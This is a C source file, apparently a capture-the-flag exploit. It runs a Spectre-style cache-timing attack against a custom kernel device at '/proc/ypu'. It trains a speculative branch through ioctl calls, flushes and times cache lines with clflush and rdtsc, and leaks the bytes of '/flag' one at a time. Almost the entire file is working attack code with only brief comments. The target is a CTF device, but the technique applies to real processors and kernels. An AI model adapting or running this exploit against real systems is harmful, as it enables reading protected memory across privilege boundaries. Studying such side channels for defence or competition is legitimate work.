#define _GNU_SOURCE
#include <time.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <x86intrin.h>
#include <fcntl.h>
#include <string.h>
#include <math.h>
#include <sched.h>
#include <sys/mman.h>
#include <sys/ioctl.h>

#define CACHE_HIT_THRESHOLD 200
#define CACHE_LINE_SIZE 0x1000
#define BUFF_SIZE 256

int fd;
char *shared_buffer;

void pre_work() {
	uint8_t *addr;
	for (int j = 0; j < BUFF_SIZE; j++) {
		addr = (uint8_t *) (shared_buffer + j * CACHE_LINE_SIZE);
		_mm_clflush(addr);
	}
}

uint64_t time_access_no_flush(void* ptr) {
    uint64_t start, end;
    start = __rdtsc();
    uint64_t volatile x = *(uint64_t volatile*)ptr;
    _mm_mfence();
    end = __rdtsc();
    return end - start;
}

void set_affinity() {
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(0, &set);
	sched_setaffinity(0, sizeof(set), &set);
}

bool post_work_inner_work(int mix_i){
	uint8_t *addr;
	size_t cache_hit_threshold = CACHE_HIT_THRESHOLD;
	int offset;
	uint64_t t_no_flush;
	offset = mix_i * CACHE_LINE_SIZE;
	addr = (uint8_t *) (shared_buffer + offset);
	t_no_flush = time_access_no_flush(addr);
	if (mix_i != 0 && mix_i != 255 && t_no_flush <= cache_hit_threshold) {
		// printf("cache hit at %d timing: %ld\n", mix_i, t_no_flush);
		return true;
	}
	return false;
}

int post_work(int *stats) {
	for (size_t i = 0; i < 256; i++) {
		int mix_i = ((i * 167) + 13) & 255;
		if (post_work_inner_work(mix_i)) {
			stats[mix_i]++;
		}
	}
}

bool unsolved(int *results, int length) {
	for (int i = 0; i < length; i++) {
		if (results[i] == 0)
			return true;
	}
	return false;
}

void train_target(){
	// training phase
	memcpy(shared_buffer, "\x20\x20\x00\x20\x40\x80\x20\x08\xff\x04\x20\x08\x20\x20\x80\x04\x40\x20", 20);
	for (int i = 0; i < 100; i++) {
		int mix_i = ((i * 167) + 13) & 255;
		shared_buffer[14] = mix_i % 127;
		ioctl(fd, 1337, 0);
		sched_yield();
	}
}

void speculate(int pos){
	memcpy(shared_buffer, "\x20\x20\x00\x04\x08\x20\x20\x20\x00\x20\x40\x80\x20\x08\xff\x04\x20\x08\x20\x20\x80\x04\x40\x20", 26);
	shared_buffer[20] = pos + 0x80;
	ioctl(fd, 1337, pos);
	//sched_yield();
}

void exploit(int len) {
	int *results = malloc(sizeof(int) * len + 1);
	int max_index = 0;
	int max_val = 0;
	int stats[256] = {0};

	while (unsolved(results, len)){
		for (int i = 0; i < len; i++) {
			if (results[i] != '\x00')
				continue;

			// clear stats array
			for (int j = 0; j < 255; j++)
				stats[j] = 0;

			// if all values known, break
			if (!unsolved(results, len)) {
				break;
			}

			// work loop
			// changed 1000 to 100
			for (int j = 0; j < 1000; j++) {
				pre_work();
				train_target();
				pre_work();

				speculate(i);
				// exploit target
				post_work(stats);
			}
			// review stats and print out
			max_val = 0;
			max_index = 0;
			for (int j = 0x20; j < 128; j++) {
				if (stats[j] > max_val) {
					max_index = j;
					max_val = stats[j];
				}
			}
			// save result
			if ( max_index != 0 && max_val > 4) {
				results[i] = max_index;
				// show current stats
				printf("\nattempted index %i found %d = %c with %d hits\n", i, max_index, max_index, stats[max_index]);
			}

			printf("current results\nvalue: ");
			for (int j = 0; j < len; j++) {
				// printf("index: %d value: %c\n", j, results[j]);
				printf("%c", results[j]);
			}
		}
	}
}


int main(){
    // read_to_mem i shared_buffer
    // int v2;
    // for (int i=0; i < 256; i++) {
    // 	int mix_i = ((i * 167) + 13) & 255;
    // 	v2 = &shared_buffer[mix_i * 0x1000];
    // }

    // payload loads "/flag" in memory, opens it, reads from it
    // and exec(128-135) accesses the flag bytes

    // v2(p) = state->memory[0x1000 * (unsigned __int64)state->regs.ds(0) + addr(128)];
    // v4(shared_buffer + 0x70*0x1000) = &state->code->op(shared_buffer) + 0x1000 * v2(0x70);
	puts("rolling");
	set_affinity();
    fd = open("/proc/ypu", 2);
    shared_buffer = (char *)mmap(0, 255 * 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

    FILE *open = fopen("open", "r");
    fread(shared_buffer, 1, 200, open);
    ioctl(fd, 1337, 0);

    memset(shared_buffer, 0, 200);
	exploit(55);

	return 0;
}

